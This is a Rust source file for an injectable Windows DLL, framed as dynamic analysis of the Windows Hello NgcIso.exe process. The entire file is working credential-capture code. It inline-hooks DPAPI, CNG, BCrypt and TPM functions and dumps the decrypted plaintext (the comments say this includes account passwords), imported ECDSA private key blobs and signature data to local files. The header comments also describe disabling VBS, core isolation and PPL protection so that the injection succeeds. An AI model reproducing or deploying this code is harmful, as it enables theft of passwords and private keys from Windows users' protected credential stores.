//! NGC 明文捕获注入 DLL（NgcIso.exe 动态分析专用）
//!
//! 设计目标（推翻旧版「签名 + 导出密钥」思路）：
//!   旧版试图在 credentialuibroker.exe 里 hook NCryptSignHash 后 NCryptExportKey
//!   导出 NGC 私钥——已实证失败（Export Policy=0，所有格式 sz=0）。
//!
//!   真实的 NGC 保护链 = TPM(Tbsip_Submit_Command) + DPAPI(CryptUnprotectData)
//!   + CNG(NCrypt/BCryptDecrypt)，且全部在 **NgcIso.exe**（VTL1/PPL、Session 0
//!   的 trustlet）内执行。私钥若被 TPM 封装则永不出 trustlet——拿不到可移植私钥，
//!   但**解密出口的明文（账户密码 / 解封结果）会短暂出现在这些 API 的输出缓冲区**。
//!
//!   因此本 DLL 改为 hook「解密出口」并抓取**明文输出**：
//!     - CryptUnprotectData     (crypt32.dll)  → pDataOut 明文
//!     - NCryptDecrypt          (ncrypt.dll)   → pbOutput 明文
//!     - BCryptDecrypt          (bcrypt.dll)   → pbOutput 明文（vault AES 解密）
//!     - NCryptUnprotectSecret  (ncrypt.dll)   → *ppbData 明文（DPAPI-NG）
//!     - Tbsip_Submit_Command   (tbs.dll)      → pabResult 原始 TPM 响应（多为不透明）
//!
//! 前置条件（关键）：NgcIso.exe 是 Session 0 的 PPL 保护进程，**普通注入会被
//!   拒绝**。必须先按 reverse_analysis/WINDBG_RUNBOOK.md 关闭 VBS/核心隔离、开
//!   测试签名、剥离 PPL 之后，本 DLL 才能被注入并 hook 成功。
//!
//! 输出: C:\FaceWinUnlock\captured_keys\
//!   - plaintext_<hook>_<n>.bin  抓到的明文（含密码，**敏感，分析后请删除**）
//!   - capture.log               仅元数据（hook 名 / 字节数 / 文件名，**不含明文**）

#![cfg(windows)]
#![allow(static_mut_refs, non_snake_case)]

use std::cell::Cell;
use std::ffi::c_void;
use std::sync::Mutex;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS,
};
use windows_core::PCWSTR;

// ─── 常量 ────────────────────────────────────────────────────────────────
const OUTPUT_DIR: &str = r"C:\FaceWinUnlock\captured_keys";
/// 单次 dump 的安全上限，防止误抓超大缓冲区拖垮磁盘。
const MAX_DUMP: usize = 1 << 20; // 1 MiB

// ─── 辅助函数 ─────────────────────────────────────────────────────────────
fn widestr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

/// 14 字节窃取 + 12 字节绝对跳转回填（trampoline 尾部跳回原函数+14）。
fn build_abs_jmp(target: *const c_void) -> [u8; 12] {
    let addr = target as u64;
    [
        0x48, 0xB8, // mov rax, imm64
        addr as u8, (addr >> 8) as u8, (addr >> 16) as u8, (addr >> 24) as u8,
        (addr >> 32) as u8, (addr >> 40) as u8, (addr >> 48) as u8, (addr >> 56) as u8,
        0xFF, 0xE0, // jmp rax
    ]
}

fn log_cap(level: &str, msg: &str) {
    let _ = std::fs::create_dir_all(OUTPUT_DIR);
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(format!("{}\\capture.log", OUTPUT_DIR))
    {
        use std::io::Write;
        let _ = writeln!(f, "[{}] {}", level, msg);
    }
}

/// 把抓到的明文写入本地 .bin 文件；capture.log 只记录元数据，**绝不写明文字节**。
unsafe fn dump_plaintext(hook: &str, ptr: *const u8, len: usize) {
    if ptr.is_null() || len == 0 || len > MAX_DUMP {
        return;
    }
    let data = std::slice::from_raw_parts(ptr, len);
    let mut count = CAPTURE_COUNT.lock().unwrap();
    *count += 1;
    let n = *count;
    drop(count);
    let _ = std::fs::create_dir_all(OUTPUT_DIR);
    let fname = format!("{}\\plaintext_{}_{}.bin", OUTPUT_DIR, hook, n);
    let _ = std::fs::write(&fname, data);
    // 注意：不在日志里输出任何明文字节，仅长度 + 文件名。
    log_cap("CAPTURE", &format!("{hook} #{n}: {len} bytes -> {fname}"));
}

// ─── 全局状态 ─────────────────────────────────────────────────────────────
static mut TRAMP_CUP: *mut u8 = std::ptr::null_mut(); // CryptUnprotectData
static mut TRAMP_NCD: *mut u8 = std::ptr::null_mut(); // NCryptDecrypt
static mut TRAMP_BCD: *mut u8 = std::ptr::null_mut(); // BCryptDecrypt
static mut TRAMP_NUS: *mut u8 = std::ptr::null_mut(); // NCryptUnprotectSecret
static mut TRAMP_TBS: *mut u8 = std::ptr::null_mut(); // Tbsip_Submit_Command
static mut TRAMP_BIK: *mut u8 = std::ptr::null_mut(); // BCryptImportKeyPair（★ 首要）
static mut TRAMP_BSH: *mut u8 = std::ptr::null_mut(); // BCryptSignHash（辅助关联）
static mut TRAMP_NSH: *mut u8 = std::ptr::null_mut(); // NCryptSignHash（★ FIDO2 持久化密钥签名）
static CAPTURE_COUNT: Mutex<u32> = Mutex::new(0);
static INIT_PID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

// 每线程重入保护：捕获代码本身可能再次触达被 hook 的 API（理论上），
// 用 thread-local 而非全局锁，避免一个线程的 hook 阻塞另一个线程的捕获。
thread_local! {
    static IN_HOOK: Cell<bool> = const { Cell::new(false) };
}
fn enter_capture() -> bool {
    IN_HOOK.with(|c| {
        if c.get() {
            false
        } else {
            c.set(true);
            true
        }
    })
}
fn leave_capture() {
    IN_HOOK.with(|c| c.set(false));
}

// ─── DLL 入口 ─────────────────────────────────────────────────────────────
#[no_mangle]
pub extern "system" fn DllMain(_hinst: HANDLE, reason: u32, _reserved: *mut c_void) -> i32 {
    if reason == 1 {
        std::thread::spawn(init_hooks);
    }
    1
}

fn init_hooks() {
    let _ = std::fs::create_dir_all(OUTPUT_DIR);
    INIT_PID.store(std::process::id(), std::sync::atomic::Ordering::SeqCst);
    log_cap(
        "INFO",
        &format!(
            "NGC plaintext capture loaded, PID={}",
            INIT_PID.load(std::sync::atomic::Ordering::SeqCst)
        ),
    );

    unsafe {
        // 确保目标模块已加载（NgcIso.exe 内这些 DLL 一般已在）。
        for dll in ["crypt32.dll", "ncrypt.dll", "bcrypt.dll", "tbs.dll"] {
            let _ = LoadLibraryW(PCWSTR::from_raw(widestr(dll).as_ptr())).ok();
        }
        install_one_hook("crypt32.dll", "CryptUnprotectData", h_crypt_unprotect as _, &mut TRAMP_CUP);
        install_one_hook("ncrypt.dll", "NCryptDecrypt", h_ncrypt_decrypt as _, &mut TRAMP_NCD);
        install_one_hook("bcrypt.dll", "BCryptDecrypt", h_bcrypt_decrypt as _, &mut TRAMP_BCD);
        install_one_hook("ncrypt.dll", "NCryptUnprotectSecret", h_ncrypt_unprotect as _, &mut TRAMP_NUS);
        install_one_hook("tbs.dll", "Tbsip_Submit_Command", h_tbs_submit as _, &mut TRAMP_TBS);
        // ★ C 方案新增：BCryptImportKeyPair（首要，抓 ECDSA_P256 私钥）+ BCryptSignHash（辅助关联）
        install_one_hook("bcrypt.dll", "BCryptImportKeyPair", h_bcrypt_import_keypair as _, &mut TRAMP_BIK);
        install_one_hook("bcrypt.dll", "BCryptSignHash", h_bcrypt_sign_hash as _, &mut TRAMP_BSH);
        // ★ NCryptSignHash：FIDO2 持久化密钥签名必经之路
        install_one_hook("ncrypt.dll", "NCryptSignHash", h_ncrypt_sign_hash as _, &mut TRAMP_NSH);
    }
    log_cap("INFO", "hook installation finished");
}

unsafe fn install_one_hook(dll: &str, func: &str, hook_fn: *const c_void, tramp_slot: &mut *mut u8) {
    let h = match GetModuleHandleW(PCWSTR::from_raw(widestr(dll).as_ptr())) {
        Ok(h) => h,
        Err(e) => {
            log_cap("WARN", &format!("{dll}: {e}"));
            return;
        }
    };
    let cname = std::ffi::CString::new(func).unwrap();
    let target = match GetProcAddress(h, windows_core::PCSTR::from_raw(cname.as_ptr() as *const u8)) {
        Some(p) => p as *mut u8,
        None => {
            log_cap("WARN", &format!("{func} not found"));
            return;
        }
    };
    let tramp = VirtualAlloc(None, 32, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if tramp.is_null() {
        log_cap("WARN", &format!("VAlloc {func} failed"));
        return;
    }
    // 备份原始 14 字节到 trampoline，并追加跳回 target+14。
    let mut orig = [0u8; 14];
    std::ptr::copy_nonoverlapping(target, orig.as_mut_ptr(), 14);
    std::ptr::copy_nonoverlapping(orig.as_ptr(), tramp as *mut u8, 14);
    let back = build_abs_jmp(target.add(14) as *const c_void);
    std::ptr::copy_nonoverlapping(back.as_ptr(), (tramp as *mut u8).add(14), 12);
    *tramp_slot = tramp as *mut u8;
    // 把 target 前 14 字节改成跳到 hook_fn。
    let mut old = PAGE_PROTECTION_FLAGS(0);
    let _ = VirtualProtect(target as *const c_void, 14, PAGE_EXECUTE_READWRITE, &mut old);
    let jmp = build_abs_jmp(hook_fn);
    std::ptr::copy_nonoverlapping(jmp.as_ptr(), target, 14);
    let _ = VirtualProtect(target as *const c_void, 14, old, &mut old);
    log_cap("OK", &format!("Hooked {func} in {dll} at 0x{:X}", target as usize));
}

// ─── DATA_BLOB (CRYPTOAPI_BLOB) ───────────────────────────────────────────
// x64 布局: cb @0 (u32), 4B 对齐填充, pb @8 (ptr)。repr(C) 自动产生该填充。
#[repr(C)]
struct DataBlob {
    cb: u32,
    pb: *mut u8,
}

// ─── Hook 函数签名 ─────────────────────────────────────────────────────────
type CryptUnprotectDataFn = unsafe extern "system" fn(
    *const DataBlob, // pDataIn
    *mut *mut u16,   // ppszDataDescr
    *const DataBlob, // pOptionalEntropy
    *const c_void,   // pvReserved
    *const c_void,   // pPromptStruct
    u32,             // dwFlags
    *mut DataBlob,   // pDataOut (OUT 明文)
) -> i32; // BOOL

type NCryptDecryptFn = unsafe extern "system" fn(
    usize,         // hKey
    *const u8,     // pbInput
    u32,           // cbInput
    *const c_void, // pPaddingInfo
    *mut u8,       // pbOutput (OUT 明文)
    u32,           // cbOutput
    *mut u32,      // pcbResult
    u32,           // dwFlags
) -> i32; // SECURITY_STATUS

type BCryptDecryptFn = unsafe extern "system" fn(
    usize,         // hKey
    *const u8,     // pbInput
    u32,           // cbInput
    *const c_void, // pPaddingInfo
    *mut u8,       // pbIV
    u32,           // cbIV
    *mut u8,       // pbOutput (OUT 明文)
    u32,           // cbOutput
    *mut u32,      // pcbResult
    u32,           // dwFlags
) -> i32; // NTSTATUS

type NCryptUnprotectSecretFn = unsafe extern "system" fn(
    *mut usize,    // phDescriptor
    u32,           // dwFlags
    *const u8,     // pbProtectedBlob
    u32,           // cbProtectedBlob
    *const c_void, // pMemPara
    *const c_void, // hWnd
    *mut *mut u8,  // ppbData (OUT 明文)
    *mut u32,      // pcbData
) -> i32; // SECURITY_STATUS

type TbsipSubmitFn = unsafe extern "system" fn(
    *mut c_void, // hContext
    u32,         // Locality
    u32,         // Priority
    *const u8,   // pabCommand
    u32,         // cbCommand
    *mut u8,     // pabResult (OUT TPM 响应)
    *mut u32,    // pcbResult
) -> u32; // TBS_RESULT

// BCryptImportKeyPair — ★ 首要目标：抓签名前导入的明文 ECDSA_P256 私钥 blob
type BCryptImportKeyPairFn = unsafe extern "system" fn(
    usize,      // hAlgorithm (BCRYPT_ALG_HANDLE)
    usize,      // hImportKey
    *const u16, // pszBlobType (LPCWSTR) — 期望 "ECCPRIVATEBLOB"
    *mut usize, // phKey (OUT BCRYPT_KEY_HANDLE)
    *const u8,  // pbInput ★ 明文私钥 blob
    u32,        // cbInput — P256=104 bytes
    u32,        // dwFlags
) -> i32; // NTSTATUS

// BCryptSignHash — 辅助关联：标记"正在签名"的时刻 + hash 大小
type BCryptSignHashFn = unsafe extern "system" fn(
    usize,         // hKey
    *const c_void, // pPaddingInfo
    *const u8,     // pbInput (hash to sign)
    u32,           // cbInput
    *mut u8,       // pbOutput (OUT signature)
    u32,           // cbOutput
    *mut u32,      // pcbResult
    u32,           // dwFlags
) -> i32; // NTSTATUS

// NCryptSignHash — FIDO2 持久化密钥签名（Windows Hello Passport KSP）
type NCryptSignHashFn = unsafe extern "system" fn(
    usize,         // hKey (NCRYPT_KEY_HANDLE)
    *const c_void, // pPaddingInfo
    *const u8,     // pbHashValue (hash to sign)
    u32,           // cbHashValue
    *mut u8,       // pbSignature (OUT)
    u32,           // cbSignature
    *mut u32,      // pcbResult
    u32,           // dwFlags
) -> i32; // SECURITY_STATUS

// ─── 辅助：宽字符串比较 ───────────────────────────────────────────────────
fn wstr_eq(ptr: *const u16, expected: &str) -> bool {
    if ptr.is_null() { return false; }
    let expected_wide: Vec<u16> = expected.encode_utf16().collect(); // 不含 null terminator
    unsafe {
        for (i, &ch) in expected_wide.iter().enumerate() {
            let actual = *ptr.add(i);
            if actual != ch { return false; }
        }
        // 期望的下一个字符应是 null terminator
        *ptr.add(expected_wide.len()) == 0
    }
}

// ─── Hook 实现 ─────────────────────────────────────────────────────────────
extern "system" fn h_crypt_unprotect(
    p_in: *const DataBlob,
    descr: *mut *mut u16,
    entropy: *const DataBlob,
    reserved: *const c_void,
    prompt: *const c_void,
    flags: u32,
    p_out: *mut DataBlob,
) -> i32 {
    unsafe {
        let orig: CryptUnprotectDataFn = std::mem::transmute(TRAMP_CUP as *const c_void);
        let r = orig(p_in, descr, entropy, reserved, prompt, flags, p_out);
        if r != 0 && !p_out.is_null() && enter_capture() {
            dump_plaintext("CryptUnprotectData", (*p_out).pb, (*p_out).cb as usize);
            leave_capture();
        }
        r
    }
}

extern "system" fn h_ncrypt_decrypt(
    h_key: usize,
    pb_in: *const u8,
    cb_in: u32,
    pad: *const c_void,
    pb_out: *mut u8,
    cb_out: u32,
    pcb: *mut u32,
    flags: u32,
) -> i32 {
    unsafe {
        let orig: NCryptDecryptFn = std::mem::transmute(TRAMP_NCD as *const c_void);
        let r = orig(h_key, pb_in, cb_in, pad, pb_out, cb_out, pcb, flags);
        // 仅在「第二次调用（有输出缓冲）+ 成功」时抓明文。
        if r == 0 && !pb_out.is_null() && !pcb.is_null() && enter_capture() {
            dump_plaintext("NCryptDecrypt", pb_out, *pcb as usize);
            leave_capture();
        }
        r
    }
}

extern "system" fn h_bcrypt_decrypt(
    h_key: usize,
    pb_in: *const u8,
    cb_in: u32,
    pad: *const c_void,
    pb_iv: *mut u8,
    cb_iv: u32,
    pb_out: *mut u8,
    cb_out: u32,
    pcb: *mut u32,
    flags: u32,
) -> i32 {
    unsafe {
        let orig: BCryptDecryptFn = std::mem::transmute(TRAMP_BCD as *const c_void);
        let r = orig(h_key, pb_in, cb_in, pad, pb_iv, cb_iv, pb_out, cb_out, pcb, flags);
        // NT_SUCCESS = (r as i32) >= 0
        if r >= 0 && !pb_out.is_null() && !pcb.is_null() && enter_capture() {
            dump_plaintext("BCryptDecrypt", pb_out, *pcb as usize);
            leave_capture();
        }
        r
    }
}

extern "system" fn h_ncrypt_unprotect(
    descr: *mut usize,
    flags: u32,
    pb_blob: *const u8,
    cb_blob: u32,
    mem_para: *const c_void,
    hwnd: *const c_void,
    ppb: *mut *mut u8,
    pcb: *mut u32,
) -> i32 {
    unsafe {
        let orig: NCryptUnprotectSecretFn = std::mem::transmute(TRAMP_NUS as *const c_void);
        let r = orig(descr, flags, pb_blob, cb_blob, mem_para, hwnd, ppb, pcb);
        if r == 0 && !ppb.is_null() && !pcb.is_null() && enter_capture() {
            dump_plaintext("NCryptUnprotectSecret", *ppb, *pcb as usize);
            leave_capture();
        }
        r
    }
}

extern "system" fn h_tbs_submit(
    h_ctx: *mut c_void,
    locality: u32,
    priority: u32,
    pab_cmd: *const u8,
    cb_cmd: u32,
    pab_res: *mut u8,
    pcb_res: *mut u32,
) -> u32 {
    unsafe {
        let orig: TbsipSubmitFn = std::mem::transmute(TRAMP_TBS as *const c_void);
        let r = orig(h_ctx, locality, priority, pab_cmd, cb_cmd, pab_res, pcb_res);
        // 原始 TPM 响应多为不透明（封装密钥不出 TPM），仍 dump 供离线分析。
        if r == 0 && !pab_res.is_null() && !pcb_res.is_null() && enter_capture() {
            dump_plaintext("Tbsip_Submit_Command", pab_res, *pcb_res as usize);
            leave_capture();
        }
        r
    }
}

// ─── ★ BCryptImportKeyPair hook（首要目标：抓 ECDSA_P256 明文私钥）──────

extern "system" fn h_bcrypt_import_keypair(
    h_alg: usize,
    h_import_key: usize,
    psz_blob_type: *const u16,
    ph_key: *mut usize,
    pb_input: *const u8,
    cb_input: u32,
    dw_flags: u32,
) -> i32 {
    unsafe {
        let orig: BCryptImportKeyPairFn = std::mem::transmute(TRAMP_BIK as *const c_void);
        // 先调原函数——只 dump 成功导入的密钥
        let r = orig(h_alg, h_import_key, psz_blob_type, ph_key, pb_input, cb_input, dw_flags);
        // NT_SUCCESS = (r as i32) >= 0
        if r >= 0 && !pb_input.is_null() && cb_input > 0 && enter_capture() {
            let blob_type = if !psz_blob_type.is_null() {
                let mut s = String::new();
                let mut i = 0usize;
                loop {
                    let ch = *psz_blob_type.add(i);
                    if ch == 0 { break; }
                    if let Some(c) = char::from_u32(ch as u32) {
                        if c.is_ascii_graphic() || c == ' ' { s.push(c); } else { s.push('?'); }
                    }
                    i += 1;
                    if i > 128 { break; } // 安全上限
                }
                s
            } else {
                "NULL".to_string()
            };

            if wstr_eq(psz_blob_type, "ECCPRIVATEBLOB") {
                // ★ 最高价值：ECDSA_P256 明文私钥（104 字节）
                log_cap("CAPTURE",
                    &format!("BCryptImportKeyPair ECCPRIVATEBLOB cbInput={cb_input} blobType={blob_type}"),
                );
                dump_plaintext("BCryptImportKeyPair_ECC", pb_input, cb_input as usize);
            } else if cb_input <= 4096 {
                // 其他密钥类型（RSA 等）也记录，但标注类型
                log_cap("CAPTURE",
                    &format!("BCryptImportKeyPair {} cbInput={cb_input}", blob_type),
                );
                dump_plaintext(&format!("BCryptImportKeyPair_{}", blob_type.replace(' ', "_")),
                    pb_input, cb_input as usize);
            }
            leave_capture();
        }
        r
    }
}

// ─── BCryptSignHash hook（辅助关联：记录签名事件 + hash 大小）───────────

extern "system" fn h_bcrypt_sign_hash(
    h_key: usize,
    p_padding: *const c_void,
    pb_input: *const u8,
    cb_input: u32,
    pb_output: *mut u8,
    cb_output: u32,
    pcb_result: *mut u32,
    dw_flags: u32,
) -> i32 {
    unsafe {
        let orig: BCryptSignHashFn = std::mem::transmute(TRAMP_BSH as *const c_void);
        let r = orig(h_key, p_padding, pb_input, cb_input, pb_output, cb_output, pcb_result, dw_flags);
        // 仅在「实际签名执行成功」（pbOutput 非空 + cbOutput>0 + NT_SUCCESS）时记录。
        // 跳过 size-query 调用（pbOutput=NULL 或 cbOutput=0）。
        if r >= 0 && !pb_output.is_null() && cb_output > 0 && !pcb_result.is_null() && enter_capture() {
            let sig_len = *pcb_result as usize;
            log_cap("SIGN",
                &format!("BCryptSignHash hKey=0x{h_key:X} hash={cb_input}B sig={sig_len}B"),
            );
            // 仅 dump hash 输入（32B SHA-256），不 dump 签名输出
            // hash 可用于和已知 challenge 的 SHA-256 比对以确认为 FIDO 签名
            if cb_input > 0 && cb_input <= 64 && !pb_input.is_null() {
                dump_plaintext("BCryptSignHash_input", pb_input, cb_input as usize);
            }
            leave_capture();
        }
        r
    }
}

// ─── NCryptSignHash hook（FIDO2 持久化密钥签名 — 签名发生在哪就在哪捕获）─

extern "system" fn h_ncrypt_sign_hash(
    h_key: usize,
    p_padding: *const c_void,
    pb_hash: *const u8,
    cb_hash: u32,
    pb_sig: *mut u8,
    cb_sig: u32,
    pcb_result: *mut u32,
    dw_flags: u32,
) -> i32 {
    unsafe {
        let orig: NCryptSignHashFn = std::mem::transmute(TRAMP_NSH as *const c_void);
        let r = orig(h_key, p_padding, pb_hash, cb_hash, pb_sig, cb_sig, pcb_result, dw_flags);
        if r == 0 && !pb_sig.is_null() && cb_sig > 0 && !pcb_result.is_null() && enter_capture() {
            let sig_len = *pcb_result as usize;
            log_cap("SIGN",
                &format!("NCryptSignHash hKey=0x{h_key:X} hash={cb_hash}B sig={sig_len}B"),
            );
            if cb_hash > 0 && cb_hash <= 64 && !pb_hash.is_null() {
                dump_plaintext("NCryptSignHash_input", pb_hash, cb_hash as usize);
            }
            if sig_len > 0 && sig_len <= 1024 && !pb_sig.is_null() {
                dump_plaintext("NCryptSignHash_sig", pb_sig, sig_len);
            }
            leave_capture();
        }
        r
    }
}
